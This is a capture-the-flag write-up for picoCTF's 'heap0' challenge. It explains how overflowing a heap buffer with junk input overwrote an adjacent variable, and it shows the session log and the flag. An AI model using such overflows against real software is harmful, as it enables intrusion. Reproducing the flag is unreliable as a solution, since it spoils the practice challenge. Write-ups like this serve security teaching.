#Description
Are overflows just a stack concern?

#Solve
Checked the source code, found that program was asking to write to buffer , saw that to get flag the program checks if safe_var is "bico" and that memory for safe_var is allocted with malloc, and it is 5 bytes, and saw as a clue the description talks about overflows, so with the given function to write buffer i overflowed to the safe_var buffer which was very close to the memory location of input buffer.
then did the check for flag option.

`flag : picoCTF{my_first_heap_overflow_e4c92a78}`

```bash
 Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5b80a61852b0  ->   pico
+-------------+----------------+
[*]   0x5b80a61852d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aidnaidjiadiajdiajidjiasjdiajdijsaidjasijdisad

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5b80a61852b0  ->   aidnaidjiadiajdiajidjiasjdiajdijsaidjasijdisad
+-------------+----------------+
[*]   0x5b80a61852d0  ->   saidjasijdisad
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_e4c92a78}
```

